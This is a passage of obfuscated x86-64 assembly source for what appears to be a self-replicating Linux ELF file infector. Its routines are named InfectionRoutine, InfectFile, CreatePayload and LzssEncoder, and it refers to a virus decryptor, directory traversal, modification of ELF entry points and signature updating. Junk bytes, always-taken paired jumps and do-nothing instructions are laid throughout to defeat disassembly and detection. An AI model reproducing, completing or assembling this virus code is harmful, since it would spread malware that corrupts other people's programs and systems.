..@X7cGr2NKFuHw:
    mov         rbp, rbp
    js          ..@JlKqWxVmJhne
    jns         ..@JlKqWxVmJhne
..@MP9QmLL2muUr:
    push        rdx
    jmp         ..@CH5S7CkXhWx9
..@3061efJyA0pe:
    xchg        rdx, rdx
    jl          ..@CyZcnCTKC1dY
    jge         ..@CyZcnCTKC1dY
..@3ewpnq0acImD:
    push        rdi
    jmp         ..@dShQsk7vN4j8
..@DxQ4DyGxRWS4:
    xchg        rdx, rdx
    je          ..@9jwWpuZmCJ7m
    jne         ..@9jwWpuZmCJ7m
..@l7kX0ITApS4Y:
    push        rcx
    jmp         ..@ltSpCIsF5poJ
..@Zs9MLesniwux:
    ret
    js          ..@mLT7N7Dd9KB6
    jns         ..@mLT7N7Dd9KB6
..@CzwJ4HBKBfcq:
    cmp         bx, WORD [rsp+_LZSSE_OFF.w_index]
    jl          ..@mRaqOwUutBlP
    jge         ..@mRaqOwUutBlP
..@mrlbUB1entT9:
    push        r4
    jmp         $+5
db 0x07, 0x68, 0x1a
    jmp         $+3
db 0x0e
    jmp         ..@2K7DaJ9zfLmm
..@8zDNuZy7LI4c:
    xor         rdi, rdi
    jmp         $+4
db 0x72, 0x0c
    jl          ..@631yqi0asW2H
    jge         ..@631yqi0asW2H
..@iot56Ngvcin5:
    xor         rdi, rdi
    jmp         $+4
db 0x9f, 0x9c
    jl          ..@5qc2L2OoF3Su
    jge         ..@5qc2L2OoF3Su
..@gD2lsVH2GNvC:
    push        r1
    jmp         ..@QkDckLdWkE40
..@xSm6FmSefEDV:
    test        r3, r3
    je          ..@DpRiNWjtN5WU
    jne         ..@DpRiNWjtN5WU
..@Ts4jziOgIhJF:
    mov         r2, QWORD [r5+file.filesize]
    js          ..@ae19FYJpRlQy
    jns         ..@ae19FYJpRlQy
..@DleFbtqn7Frp:
    push        rsi
    jb          ..@dSFRgHd3FWkw
    jae         ..@dSFRgHd3FWkw
..@uJDd0ZMJuiqO:
    rep         nop
    jmp         $+5
db 0x94, 0xca, 0x60
    jl          ..@L1N2BSfCbowM
    jge         ..@L1N2BSfCbowM
..@DawMICScv7Mw:
    push        rcx
    jmp         $+4
db 0xe9, 0x43
    jmp         ..@xKuiNev9QAGM
..@l56XmNOqKMjG:
    mov         eax, SYS_READ
    jmp         $+3
db 0x78
    jmp         $+3
db 0x36
    jmp         $+5
db 0xce, 0x46, 0x2c
    js          ..@UVklK2vdedpj
    jns         ..@UVklK2vdedpj
..@yXw7gWdp4NhQ:
    xchg        rax, rax
    jmp         $+3
db 0xe7
    jmp         $+3
db 0x06
    jmp         $+3
db 0xbe
    jmp         $+3
db 0xaf
    jb          ..@YRyIAl18Pruf
    jae         ..@YRyIAl18Pruf
..@TDTTe8Sb3mKb:
    xchg        rax, rax
    jb          ..@kJW6IZutND33
    jae         ..@kJW6IZutND33
..@q41ZDLRBGhND:
%ifdef X86_32
    xchg        rcx, rcx
%endif
    jmp         $+3
db 0x0b
    jmp         $+5
db 0xe9, 0x73, 0x36
    jmp         $+4
db 0xfa, 0xb8
    js          ..@Aleknwkzn5fv
    jns         ..@Aleknwkzn5fv
..@CnYxte0vI4XJ:
    movdqu      xmm1, oWORD [rsp+0xc0]
    jmp         $+5
db 0xd1, 0x4c, 0x3e
    jl          ..@UhBIGyFE84jJ
    jge         ..@UhBIGyFE84jJ
..@FQbJsGOxUiyG:
    xchg        rsi, rsi
    jb          ..@sy8ULcB9fNVl
    jae         ..@sy8ULcB9fNVl
..@9C9O6r2OgQoN:
    jge         ..@tDBRJBo27maM
    je          ..@qw0aLEXxMuFI
    jne         ..@qw0aLEXxMuFI
..@plGLHh3U13fk:
    mov         r1, r5
    jmp         $+5
db 0xd8, 0x62, 0xb2
    je          ..@aVPGDb50KJLZ
    jne         ..@aVPGDb50KJLZ
..@qzH0FVRA8mSX:
    test        al, al
    jmp         ..@9UEXZX4q2q3X
..@ltSpCIsF5poJ:
    pop         rcx
    jmp         ..@MyKLYT2JZmoX
..@1JGuPTU1VNJ9:
    pop         rdi
    jmp         $+3
db 0xe1
    jmp         $+3
db 0x1f
    jmp         ..@T3fc3DsE27hf
..@X308ys4Ykbjs:
    pop         rsi
    je          ..@UbjYMaYQliNk
    jne         ..@UbjYMaYQliNk
..@3p18oUkRLE2Z:
    jne         ..@GuWIh8qm4zMg
    jmp         ..@I27M6PAeuawS
..@x5sknQWuD8Uv:
    add         r1, 1
    jmp         ..@WUb5ugFkI9uu
..@jPW6lyrUf0oE:
    xor         r1, r1
    jmp         ..@NUPKxncQ8M0S
..@Re2bNioTUUpb:
    xchg        rbx, rbx
    jmp         $+4
db 0x7f, 0x55
    jmp         ..@hAGHATkYp0qj
..@QmGDGVaBkp8a:
    push        rbp
    jmp         ..@SvOaOeKFCW0d
..@KzRrpgEzwxb9:
%ifdef X86_64
    mov         rsi, QWORD [r8+file.filesize]
%endif
    jb          ..@pM4SQx2C0DkX
    jae         ..@pM4SQx2C0DkX
..@5IsBvNeIogCO:
    xchg        rdi, rdi
    jmp         ..@3qQcTuuMdM1V
..@UjlrJaUOIiNv:
    xchg        rdx, rdx
    jmp         $+5
db 0x30, 0x92, 0xc1
    jb          ..@8buWpEQywzga
    jae         ..@8buWpEQywzga
..@Xr8oywAXiPcP:
    mov         rsi, rsi
    je          ..@KkNXNxxyEF8k
    jne         ..@KkNXNxxyEF8k
..@oJPYAdEdEJfE:
    add         ecx, 1
    je          ..@VCLwwye1xAsY
    jne         ..@VCLwwye1xAsY
..@0XgAlXRSK7r3:
    push        rcx
    jb          ..@qTsThhcIxz0U
    jae         ..@qTsThhcIxz0U
..@C7w1Jt332e48:
    mov         rdi, rdi
    jmp         $+5
db 0xe1, 0xaf, 0xb5
    js          ..@00MpPBU6Mo8S
    jns         ..@00MpPBU6Mo8S
..@BPf7wUtuSa9y:
    mov         r2w, WORD [r1+e_h.e_phnum]
    jb          ..@6fMoYhDlbxqM
    jae         ..@6fMoYhDlbxqM
..@hL4Jws2qhEWt:
    pop         rsi
    jmp         $+5
db 0xaf, 0x91, 0x76
    jmp         ..@STrlULrqDlWP
..@xKmYZ8AvSsJo:
    ret
    jb          CreatePayload
    jae         CreatePayload
..@FrBdeC7jzcDg:
    sub         r2, 1
    jmp         $+5
db 0x9b, 0xd0, 0x15
    jmp         $+3
db 0xd2
    js          ..@MONwi6LLQccU
    jns         ..@MONwi6LLQccU
..@EGrDaXdTUQDe:
    mov         r3, _decrypt-_virus
    jmp         $+3
db 0x80
    jmp         ..@G8g8Mx69pTpB
..@WFtAGfsUprja:
    push        rdi
    jmp         $+4
db 0x42, 0x16
    js          ..@rzvayCleuzUP
    jns         ..@rzvayCleuzUP
..@ArsDwREa56cW:
    jmp         ..@uiwJvslkkDtE
    jb          ..@bcbhFFfFBbff
    jae         ..@bcbhFFfFBbff
..@xwCJpFAuCwRa:
    push        r1
    jmp         ..@eGmnIB2vxWdz
..@mmWVZODZiZz2:
    mov         al, BYTE [rdi]
    jmp         ..@fgPmYYOYDfbA
..@rapm7Rbqkzfw:
    xchg        rdx, rdx
    js          ..@AKKUPXu9d4Si
    jns         ..@AKKUPXu9d4Si
..@8kHvrzKdmYk9:
    mov         rax, rax
    jl          ..@8jE1fNvGou2l
    jge         ..@8jE1fNvGou2l
..@ZTim0qDTXW6F:
    add         rsp, _VADDR_OFF_size
    jmp         $+5
db 0xa8, 0xc5, 0x7b
    jmp         $+4
db 0x0f, 0x07
    je          ..@HyUWwBQvl2dT
    jne         ..@HyUWwBQvl2dT
..@6sO2CDsApM89:
    mov         ax, WORD [r1+linux_dirent.d_reclen]
    jmp         $+5
db 0x53, 0x26, 0x5f
    jmp         ..@VJsA3w5NBOlB
..@wYMTki7xOSnz:
    pop         rax
    jmp         ..@aXBuhoikYsmO
..@nJhxLStnjAE6:
    xchg        rdi, rdi
    jmp         $+3
db 0x96
    js          ..@U9hJn8aUiDKE
    jns         ..@U9hJn8aUiDKE
..@08c6bcdaCEZe:
    xchg        rdx, rdx
    jl          ..@ddENvCMJXQjp
    jge         ..@ddENvCMJXQjp
..@6S4K3Y4uQAtg:
    pop         rax
    jmp         $+4
db 0x67, 0x3e
    js          ..@BYNm47wM8Ch8
    jns         ..@BYNm47wM8Ch8
..@l4BYX9El6ZXE:
%ifdef X86_64
    xor         r9, r9
%endif
    jmp         $+3
db 0x5a
    jmp         $+5
db 0x04, 0x99, 0xe2
    jmp         ..@KzRrpgEzwxb9
..@FAbHxsL40dy9:
    pop         rdx
    jmp         $+4
db 0x18, 0xe7
    jmp         $+5
db 0xde, 0x28, 0xf9
    jl          ..@8VmYV3sQyhXM
    jge         ..@8VmYV3sQyhXM
..@AZQ9O81QoN9g:
    pop         rsi
    jmp         $+5
db 0x9c, 0xbe, 0x9b
    jb          ..@Z6nmX5x5ofn9
    jae         ..@Z6nmX5x5ofn9
..@GV01BkvFxOLk:
    RFILE       rax, [rsp+_PROC_OFF.buffer], 0x100
    jmp         $+4
db 0xdd, 0xc2
    jmp         $+4
db 0xdb, 0xf2
    js          ..@HerZVKaQvXS6
    jns         ..@HerZVKaQvXS6
..@psGvXBxR3pFx:
    push        rsi
    jmp         $+5
db 0x34, 0xee, 0x4b
    jb          ..@Zwz3VFwxlhFy
    jae         ..@Zwz3VFwxlhFy
..@t1ibB9bxCdJg:
    mov         rsi, rsi
    jmp         ..@fDRxV1S5kEYP
..@oCaSTgy22RjC:
    mov         rsp, rsp
    jmp         $+4
db 0x02, 0x63
    jl          ..@LWDCIwtJVDSB
    jge         ..@LWDCIwtJVDSB
..@FY4hrDPx004g:
    add         r1, 1
    jmp         ..@n9SkVdckh70J
..@EVUtzX6sSogy:
    mov         al, BYTE [rsp+_LZSSE_OFF.mask]
    jl          ..@gcfZrNJ0TbuV
    jge         ..@gcfZrNJ0TbuV
..@EF9ZX9IfoIjw:
    push        rcx
    jmp         $+5
db 0xd8, 0xcf, 0x10
    jl          ..@XM8vU8RV1Gxk
    jge         ..@XM8vU8RV1Gxk
..@3fo5JsBHqY6F:
    pop         rax
    jmp         $+5
db 0xf1, 0x6d, 0x74
    jmp         $+3
db 0xce
    je          ..@hYL3MRUlnRWF
    jne         ..@hYL3MRUlnRWF
..@HJ1N08XY6e2a:
    mov         rdi, rdi
    js          ..@LXm66oa0ORRv
    jns         ..@LXm66oa0ORRv
..@Y2vlfs8wYIBp:
    pop         rbx
    jb          ..@HQbI4CK79NxK
    jae         ..@HQbI4CK79NxK
..@HJXbFyksaGkt:
    mov         rsp, rsp
    jb          ..@dEYtHwpeJ9nL
    jae         ..@dEYtHwpeJ9nL
..@SwYAXYKsDGyv:
%ifdef X86_64
    mov         r8d, DWORD [r8+file.filefd]
%endif
    js          ..@odQCneK6g1qc
    jns         ..@odQCneK6g1qc
..@qLsUP6pnHVai:
    push        rbx
    jmp         ..@B0LKVqKbCI5F
..@PVDH71Ud7LDT:
    mov         ecx, WINDOW_LENGTH*2
    js          ..@EaygGAoC79QP
    jns         ..@EaygGAoC79QP
..@5EZM29Z1sIoQ:
    xor         rax, rax
    jl          ..@IWZ7eEX7xwZI
    jge         ..@IWZ7eEX7xwZI
..@9fZqRVWSlbtL:
    push        rdi
    jmp         $+3
db 0x0f
    jmp         ..@d56eFUwdwsBH
..@SGkPpwBSwyEs:
    xor         rax, rax
    jmp         ..@QC4XLs4EVJIN
..@sLpyYW5rcT6U:
    xor         rdx, rdx
    js          ..@9oQFZeOtzQaR
    jns         ..@9oQFZeOtzQaR
..@1PwytZvp3sog:
    add         r5, rax
    jl          ..@LlGkq8xAA2f6
    jge         ..@LlGkq8xAA2f6
..@iFxS10ukX02c:
    test        ax, ax
    jmp         $+4
db 0x64, 0xf3
    jmp         ..@pqYA7AjnUyVR
..@89Zol8BkMVqB:
    mov         rdi, rdi
    jb          ..@MkPHfQxLozQa
    jae         ..@MkPHfQxLozQa
..@7JCXGNNpobyX:
    push        rax
    jmp         ..@GOHfy8pdmtFg
..@yEPftwKUP828:
    mov         rdx, rdx
    jl          ..@eSdMzZu9JceK
    jge         ..@eSdMzZu9JceK
..@VIfXL8MJYPKg:
    cmp         al, 0xa
    jmp         ..@BgJe6VnYhsA6
..@7zVtaUOrqfWo:
    mov         cl, BYTE [rsp+_LZSSE_OFF.cmp_len]
    js          ..@oJPYAdEdEJfE
    jns         ..@oJPYAdEdEJfE
..@akjwRgS5CmBq:
    mov         rcx, rcx
    jmp         $+4
db 0x44, 0xba
    jb          ..@0cv02zntd2mk
    jae         ..@0cv02zntd2mk
..@9Lb9nwsvL1xE:
    xchg        rdx, rdx
    jmp         $+4
db 0xa6, 0x3f
    jmp         ..@upk1k5mT2spM
..@ZuYDAtsr4mt1:
    call        CreatePayload
    jmp         ..@6AAxzdzeF9Id
..@tNE7X15DeriK:
    je          ..@ADxRDt9H3gdC
    jmp         $+5
db 0x06, 0x40, 0xb3
    jb          ..@DCbDYUXb6fI3
    jae         ..@DCbDYUXb6fI3
..@HAWiM2ATlW2V:
    xor         rax, rax
    jmp         $+5
db 0x3b, 0x0d, 0x54
    jl          ..@f4h9DK8BctSI
    jge         ..@f4h9DK8BctSI
..@g83sjMZMXyH3:
    push        rsi
    jb          ..@zk8jyh8E5g7C
    jae         ..@zk8jyh8E5g7C
..@QvbzF4IM7sH2:
    mov         r2w, WORD [rsp+_NBF_OFF.index]
    jmp         $+5
db 0xf7, 0xae, 0x50
    je          ..@jsYmRGVdKxsp
    jne         ..@jsYmRGVdKxsp
..@NAdeGXxiRLXa:
    pop         rsi
    je          ..@I8tpsgu1zqES
    jne         ..@I8tpsgu1zqES
..@mWe4wrn1tI0R:
    pop         rbx
    js          ..@Vm8uFwcwDiRy
    jns         ..@Vm8uFwcwDiRy
..@VURe3Rs10wlX:
    or          QWORD [r1+e_h.e_entry], 1b
    jmp         $+3
db 0xf9
    je          ..@eOEfMN4rRbxX
    jne         ..@eOEfMN4rRbxX
..@MslVThomuWjq:
    push        r3
    jmp         $+4
db 0x8e, 0xb0
    jmp         $+5
db 0x48, 0x1c, 0x6a
    jmp         $+5
db 0xdc, 0xa5, 0x0e
    jmp         ..@BFh7IEQRrYpN
..@XB1xk0MWH8tr:
%ifdef X86_32
    pop         rbx
%endif
    jmp         $+4
db 0x1e, 0x14
    jmp         $+4
db 0xf0, 0xd5
    jmp         $+4
db 0x83, 0x38
    jl          ..@PGALqiWbc8jY
    jge         ..@PGALqiWbc8jY
..@R7B9sTJ7lMVU:
    add         rax, p_h.p_type
    jmp         ..@MSAN1Avr2DEZ
..@cb6scVRAmz4K:
    lea         rsi, [rsp+_PAYLOAD_OFF.key]
    jmp         $+4
db 0x85, 0xc5
    je          ..@x313xcUbSJCE
    jne         ..@x313xcUbSJCE
..@Y9rFEYwCCZHN:
    xor         r1, r1
    jmp         $+3
db 0x38
    jmp         $+4
db 0x82, 0x37
    jb          ..@ZknpstkO3ZeF
    jae         ..@ZknpstkO3ZeF
..@8dF9pQStAvSL:
    push        rdi
    jmp         $+3
db 0xfe
    je          ..@7gvVERHMSfv6
    jne         ..@7gvVERHMSfv6
..@CH5S7CkXhWx9:
    pop         rdx
    jl          ..@dILj5dvR25pm
    jge         ..@dILj5dvR25pm
..@K4uhgUfiFltQ:
    mov         rcx, rcx
    js          ..@nasRf8nPB5Sv
    jns         ..@nasRf8nPB5Sv
..@3YJIsAo9SypJ:
    mov         r2, r5
    jmp         $+5
db 0x8b, 0x7d, 0x8a
    js          ..@GC4FkZSQM2I4
    jns         ..@GC4FkZSQM2I4
..@r84WpT3kWnJZ:
    mov         r1, r5
    js          ..@ZNq4dWYSebwS
    jns         ..@ZNq4dWYSebwS
..@W6tZMtPWUgC8:
    sub         WORD [rsp+_LZSSE_OFF.w_index], WINDOW_LENGTH
    jmp         $+4
db 0x4c, 0x14
    jmp         ..@yzMFIzhXnDID
..@gbLfxtMmadWA:
    mov         r1, QWORD [r5+file.fileptr]
    js          ..@avUdZh0WvoJV
    jns         ..@avUdZh0WvoJV
..@c4vJf8mW80YI:
    xchg        rcx, rcx
    jb          ..@BrFVdfwk9Bur
    jae         ..@BrFVdfwk9Bur
..@G4DjX88k80Xh:
    push        rbx
    jmp         ..@iCx2muzH4kgO
..@AXC5oVep9zZ2:
    push        rax
    jmp         $+5
db 0xf6, 0xbc, 0xc7
    jmp         $+3
db 0x63
    jmp         ..@mFec5JrDp3Gd
..@piGMzZPpmmbK:
    mov         rbp, rbp
    jmp         $+3
db 0x9d
    je          ..@ewAlu9gRoyAg
    jne         ..@ewAlu9gRoyAg
..@Z5y896HKEsuP:
%ifdef X86_32
    xor         ebp, ebp
%endif
    jb          ..@vwEQchLRDdP3
    jae         ..@vwEQchLRDdP3
..@71VzYCnjRVqh:
    push        rcx
    jmp         ..@hH8Wnws5VMrt
..@AZzwjLrw3Jq5:
    add         rdi, _signature.index-_signature.start
    je          ..@5pwYGXC11cBj
    jne         ..@5pwYGXC11cBj
..@yVmdIZu7sqfL:
    mov         rbx, rbx
    jmp         ..@fobxRCuVZg0x
..@hlx5ErTeyklG:
    mov         rcx, rcx
    jb          ..@GbxPBMeS8GWK
    jae         ..@GbxPBMeS8GWK
..@4hCYrdhx5mEi:
    xor         r1, r1
    jb          ..@RQO0Szc3IAv4
    jae         ..@RQO0Szc3IAv4
..@QpVt0F0tZntw:
    mov         rsp, rsp
    jb          ..@0BJomRNt4J82
    jae         ..@0BJomRNt4J82
..@eSzEGINkAawo:
    xor         rcx, rcx
    jl          ..@MdPcVhZspVJZ
    jge         ..@MdPcVhZspVJZ
..@MLJxElFOvt0j:
    xor         rdi, rdi
    jb          ..@mZoofZDjV5av
    jae         ..@mZoofZDjV5av
..@tDBRJBo27maM:
    add         rbx, 1
    jl          ..@fim4nhtes239
    jge         ..@fim4nhtes239
..@ugix70Ojfxmw:
    syscall
    jmp         ..@bFNSSv8Ox6yk
..@NwHRVmfnl7ca:
%ifdef X86_64
    pop         rax
%endif
    jmp         $+5
db 0x37, 0xa7, 0x2a
    jmp         $+5
db 0x4e, 0x74, 0x21
    jl          ..@nqXil7rZTv1t
    jge         ..@nqXil7rZTv1t
..@ZKWr2cWzxCjM:
    pop         rcx
    jmp         ..@T9Ky4dzzJbRI
..@JPrCogTRy3OD:
    jmp         ..@ZcJZqhnAUXGj
    jb          ..@KTbdTsOfdS0T
    jae         ..@KTbdTsOfdS0T
..@WIqLzPoOu7Sn:
    lea         rdi, [rsp+_LZSSE_OFF.buffer]
    jmp         $+4
db 0xa9, 0xbb
    js          ..@GLxW0rOrV1dt
    jns         ..@GLxW0rOrV1dt
..@cpiE5iUZNnHU:
    mov         rbp, rbp
    jmp         $+4
db 0x58, 0xcc
    jmp         $+4
db 0x0f, 0x47
    jb          ..@owTwL8dwO1Us
    jae         ..@owTwL8dwO1Us
..@kcNv3MIFoKlK:
    xor         rax, rax
    jl          ..@RzDZtRDuJYoH
    jge         ..@RzDZtRDuJYoH
..@3ivnixd0rlIU:
    xor         rax, rax
    jmp         $+4
db 0xb6, 0x99
    jl          ..@zVUvV7ZbTLGG
    jge         ..@zVUvV7ZbTLGG
..@vuknWryhvFkk:
    shr         BYTE [rsp+_LZSSE_OFF.mask], 1
    jmp         $+3
db 0x59
    jmp         $+3
db 0x68
    js          ..@EVUtzX6sSogy
    jns         ..@EVUtzX6sSogy
..@06Sjqtxo2kur:
    xchg        rax, rax
    jl          ..@TcyYNqQDOmUF
    jge         ..@TcyYNqQDOmUF
..@jyyhzQZfYMPT:
    mov         r2d, 0x1
    jmp         $+4
db 0x90, 0x44
    jmp         ..@Lpkld0ZRsSXs
..@UlRUMLeab8YC:
    mov         r5, r1
    js          ..@5EZM29Z1sIoQ
    jns         ..@5EZM29Z1sIoQ
..@4DL3oA2ueMTh:
    xchg        rsi, rsi
    jmp         $+3
db 0x3d
    jb          ..@q5EL86Bwljgd
    jae         ..@q5EL86Bwljgd
..@NSbGzyCZ9BmQ:
    push        r1
    jmp         ..@ijRsVUu6QmEP
..@RQO0Szc3IAv4:
    xor         r2, r2
    jmp         $+4
db 0x69, 0xbf
    jmp         $+3
db 0x42
    jmp         $+4
db 0xb9, 0x38
    js          ..@RSHhsJqv03Ts
    jns         ..@RSHhsJqv03Ts
..@sHy24jkYbjm1:
    mov         rsi, r5
    jmp         ..@QK1vmyoOhntR
..@gKcUzy6YWqLH:
    mov         rdx, rdx
    jmp         $+4
db 0x2e, 0x4c
    jmp         $+4
db 0x1e, 0xe6
    jmp         $+4
db 0x39, 0x99
    jmp         ..@5xqStU0Fovyw
..@vk0O6FK1KXyd:
%ifdef X86_64
    push        rdx
%endif
    jmp         $+5
db 0x05, 0xde, 0x14
    js          ..@K456sgk4nljn
    jns         ..@K456sgk4nljn
..@Muv8TxOn888g:
    rep         nop
    jl          ..@am4SbSYMG3AE
    jge         ..@am4SbSYMG3AE
..@SgWs9aPNnISh:
    mov         rdx, rdx
    jmp         ..@nJAD0BBWroHv
..@BFh7IEQRrYpN:
    rep         nop
    jmp         $+4
db 0x1e, 0x1f
    jmp         ..@KbUoQPfkIQFl
..@XfC99HbG51Vc:
    push        rbx
    jmp         $+3
db 0x52
    jmp         $+4
db 0x67, 0x1b
    js          ..@frVdG62Z46Iq
    jns         ..@frVdG62Z46Iq
..@5qTE4s00NGrz:
    pop         rsi
    jmp         ..@dHyMQcVCk7SI
..@46CI7zwaW6Es:
    push        rsi
    js          ..@A8Cirdf0x3ad
    jns         ..@A8Cirdf0x3ad
..@TL6UVoenLSaT:
    push        rdi
    jmp         $+4
db 0x63, 0xc4
    jl          ..@7lMakB4DU9fz
    jge         ..@7lMakB4DU9fz
..@8xmizjmc9cEd:
    call        InfectFile
    jmp         $+3
db 0xe1
    jl          ..@8lJUrwKpJbSt
    jge         ..@8lJUrwKpJbSt
..@cJXMT0MdXLZE:
    pop         rdi
    jmp         $+4
db 0x85, 0x5e
    js          ..@u1hGSEDuKh8f
    jns         ..@u1hGSEDuKh8f
..@1ON34x00aSZJ:
    pop         rax
    jmp         $+3
db 0x43
    jmp         ..@ablz2y0XKAAA
..@9OoAWUsM2GOG:
    je          ..@ZcJZqhnAUXGj
    jb          ..@Mnj6HFfd7BLO
    jae         ..@Mnj6HFfd7BLO
..@dSFRgHd3FWkw:
    xchg        rsi, rsi
    je          ..@r8kiYEckxExX
    jne         ..@r8kiYEckxExX
..@9L2aHK6s4H7V:
%ifdef X86_64
    pop         rbx
%endif
    jl          ..@vQuFdKhuwltj
    jge         ..@vQuFdKhuwltj
..@F24KJGq8vHza:
    pop         rcx
    jmp         $+5
db 0x7a, 0x2e, 0x4f
    jmp         $+4
db 0xe8, 0x64
    jmp         $+5
db 0xc2, 0x1b, 0x9a
    jmp         ..@yFl2EUcrMSwc
..@BxOFF784Apni:
    mov         WORD [rsp+_UPDATASIG_OFF.index], r2w
    jmp         $+5
db 0x93, 0x51, 0x97
    jmp         ..@Uu1GPgY2XTxt
..@1eg6h15RbnUI:
    lea         r1, [rsp+_INFDIR_OFF.buffer]
    jmp         $+4
db 0x1f, 0x96
    jmp         ..@QOcGNnZo6JhJ
..@1yLuRXHaiEzw:
    push        rdi
    jmp         $+4
db 0x50, 0xf0
    jb          ..@58B7poHbjusX
    jae         ..@58B7poHbjusX
..@onbhSH0DV2oI:
    pop         rdx
    jmp         ..@0o7n39dI5O9G
..@uJrf4HrgO2Da:
    pop         rcx
    jl          Strcpy
    jge         Strcpy
..@zseWye1cKnuU:
    mov         rax, rax
    jl          ..@vtG0VKLcVfQ1
    jge         ..@vtG0VKLcVfQ1
..@Y3HVrvZTCcSt:
    call        LzssEncoder
    jmp         $+5
db 0xcb, 0xe9, 0x83
    jb          ..@7K7WeoPXh3Oq
    jae         ..@7K7WeoPXh3Oq
..@lwyYHJn4iveO:
    pop         rbx
    jmp         $+3
db 0x27
    jmp         ..@oc6ADRXwR4wo
..@DCbDYUXb6fI3:
    mov         rsi, rsi
    jmp         $+4
db 0x30, 0xe4
    jl          ..@FtF69Lp0i37G
    jge         ..@FtF69Lp0i37G
..@tRXvZFYKrvCe:
    pop         rbx
    jmp         ..@AuShr8dIGaDm
..@CBIcGp0MaIFP:
    mov         rsi, rsi
    js          ..@HX316l9EULD7
    jns         ..@HX316l9EULD7
..@WXWgJcc1bT2Y:
    mov         rsi, rsi
    jmp         ..@GIQrFHBGvwHP
..@ooE7w92XR5uj:
    mov         rdi, m7
    jb          ..@DawMICScv7Mw
    jae         ..@DawMICScv7Mw
..@avUdZh0WvoJV:
    mov         r3, r2
    jmp         $+3
db 0xfc
    js          ..@Ts4jziOgIhJF
    jns         ..@Ts4jziOgIhJF
..@zaejkRYJU0y5:
    add         rax, rbx
    jb          ..@ZTim0qDTXW6F
    jae         ..@ZTim0qDTXW6F
..@FWmo02vl2tsS:
    xchg        rax, rax
    jmp         ..@nhEkL9DfS1Fn
..@BtulF49EgnKO:
    mov         r2b, BYTE [rsp+_INFDIR_OFF.depth]
    jmp         $+5
db 0xb7, 0x8a, 0x13
    jmp         ..@oPnNDFdbeFr1
..@urEgEGwyJ3V5:
    CFILE       DWORD [rsp+_KEYGEN_OFF.fd]
    jmp         $+3
db 0x27
    je          ..@OsugEdwg6gSR
    jne         ..@OsugEdwg6gSR
..@mLT7N7Dd9KB6:
    push        rsi
    jmp         $+3
db 0x21
    jmp         ..@G0vW1L1YB8uW
..@iRsbqBMDP7J5:
    jmp         ..@YtUcgTxfgnnH
    jmp         $+4
db 0xcc, 0xc9
    jmp         ..@IC0SnD98w1TZ
..@JqRxahuTiuG5:
    xchg        rax, rax
    js          ..@ESZksUhtyD9O
    jns         ..@ESZksUhtyD9O
..@FfrkxehqLzO3:
    mov         rax, rax
    je          ..@ROkBsdF9L701
    jne         ..@ROkBsdF9L701
..@M3xo1D7YjyE8:
    add         r1, 1
    jmp         $+5
db 0x0f, 0xfc, 0xcf
    jmp         $+3
db 0x65
    jmp         ..@KSers9EhjbMq
..@gePpk3uO7row:
    mov         rbx, rbx
    jmp         $+4
db 0x7c, 0xe2
    jmp         $+5
db 0x6f, 0xc7, 0x56
    jb          ..@NZOpSZAUOtKB
    jae         ..@NZOpSZAUOtKB
..@RN9T4gPzixfI:
    mov         rdx, rdx
    js          ..@7kWxfrOPR2Uk
    jns         ..@7kWxfrOPR2Uk
..@sCWIo8kRHpFL:
    xor         r2, r2
    jmp         $+3
db 0x5d
    jmp         $+3
db 0x2b
    jmp         $+3
db 0xd9
    je          ..@Xie3JWG5YAp8
    jne         ..@Xie3JWG5YAp8
..@NN6QHtqTK1GX:
    mov         rdx, rdx
    js          ..@08c6bcdaCEZe
    jns         ..@08c6bcdaCEZe
..@1WYHR1jUIupt:
    jle         ..@Bg9HwdZHm8uC
    jmp         $+4
db 0x35, 0x2f
    je          ..@JqRxahuTiuG5
    jne         ..@JqRxahuTiuG5
InfectionRoutine:
    jmp         ..@deYrIPWfG5Qw
..@WHp6I2h8IFjG:
    pop         rax
    jb          ..@47TBPhpWIozm
    jae         ..@47TBPhpWIozm
..@O9oA3H0FY5gd:
    push        rdi
    jmp         ..@FOBus61VOMET
..@Wed4AjHRflwb:
    pop         r1
    jmp         $+4
db 0x89, 0x93
    jl          ..@wKVgM87oHujP
    jge         ..@wKVgM87oHujP
..@wfSal92SRQF1:
    push        rax
    jmp         ..@VMBepjvHx9NV
..@ay9TVgXCnb4W:
    add         r1, non_packed_len+PADDING
    jb          ..@vbrRX8UWscDp
    jae         ..@vbrRX8UWscDp
..@7nWT5pXw1Y2G:
    xor         rbx, rbx
    jmp         $+3
db 0x6b
    jb          ..@jIMZUdzMkWCw
    jae         ..@jIMZUdzMkWCw
..@miL8j4nqehFM:
    push        r4
    jb          ..@raayyu4e5MHJ
    jae         ..@raayyu4e5MHJ
AddSizeMappedFile:
    jmp         ..@xQKxS9Ynyjb1
..@cBzDieMj4SwF:
    mov         rbx, rbx
    jmp         $+4
db 0xb1, 0x8b
    jmp         ..@jcTNDUMOZKVL
..@rcPf6ROZfbRn:
    mov         BYTE [r1], '/'
    jmp         $+3
db 0xb2
    jmp         ..@M3xo1D7YjyE8
..@ChAByiL0OiCs:
    push        rdi
    jmp         $+3
db 0xdd
    jmp         $+4
db 0xdc, 0x8f
    jmp         $+5
db 0x82, 0x45, 0x4e
    jmp         $+5
db 0x18, 0xc2, 0xbf
    jb          ..@NamG2rJrRGZP
    jae         ..@NamG2rJrRGZP
..@u1hGSEDuKh8f:
    push        rax
    jmp         $+4
db 0xea, 0xfd
    jb          ..@xNgmPGQzXxJ1
    jae         ..@xNgmPGQzXxJ1
..@c8UZrgj9wOW1:
    push        rcx
    jmp         $+3
db 0x68
    js          ..@q6mMcb7jrZF0
    jns         ..@q6mMcb7jrZF0
..@Yt69XV2qARzb:
    xor         r4, r4
    je          ..@x1eKWHumYhN8
    jne         ..@x1eKWHumYhN8
..@oksHuU2x9q0Q:
    movdqu      xmm1, oWORD [rsp+0xa0]
    jmp         ..@i9hZflmNJ6Of
..@9xIBYgzMsr2C:
    push        rdi
    jmp         $+5
db 0x5f, 0x08, 0xb1
    jmp         $+4
db 0x87, 0x40
    je          ..@eW7ebXkKAkm6
    jne         ..@eW7ebXkKAkm6
..@FR0z9Y1smft7:
    xchg        rax, rax
    jl          ..@f04O4axf8Kgv
    jge         ..@f04O4axf8Kgv
..@IWY9kHP2GvqJ:
    rep stosb 
    jmp         $+3
db 0x1f
    jb          ..@sLDeEWQhpVVV
    jae         ..@sLDeEWQhpVVV
..@7N1lerTubqgK:
    CFILE       DWORD [rsp+_PROC_OFF.filefd]
    jb          ..@TXJKBJtHgs2I
    jae         ..@TXJKBJtHgs2I
..@QK1vmyoOhntR:
    mov         rdi, QWORD [rsp+_UPDATASIG_OFF.signaddr]
    js          ..@WJLB4U3wl1xn
    jns         ..@WJLB4U3wl1xn
